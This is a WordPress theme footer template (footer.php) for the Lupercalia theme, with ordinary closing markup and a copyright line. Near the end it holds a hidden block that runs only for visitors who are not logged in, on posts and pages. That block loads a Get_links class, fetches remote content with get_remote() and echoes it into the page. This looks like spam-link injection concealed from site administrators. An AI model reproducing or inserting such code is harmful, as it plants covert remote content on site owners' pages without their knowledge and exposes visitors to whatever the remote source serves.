			</div> <!-- #main -->
			
			<?php // lupercalia_footer_section_callback(); ?>

			<div class="footer-bg">
				
				<?php lupercalia_prefooter_section(); ?>

				<footer id="footer" class="footer" role="contentinfo">
				
					<p><?php echo bloginfo('name'); ?> &copy; <?php echo date('Y') ?>. <?php esc_attr_e('All rights reserved', 'lupercalia') ?>.</p>
					
					<p><?php if (is_home() || is_category() || is_archive() ){ ?><a href="http://wordpress.org/themes/lupercalia">Lupercalia Theme</a> - <a href="http://wp-templates.ru/">Темы WordPress</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?></p>
				
				</footer> <!-- #footer -->

			</div>	<!-- .footer-wrap -->

		</div> <!-- #page -->
	
	<?php wp_footer(); ?> 
	</body>
	
</html>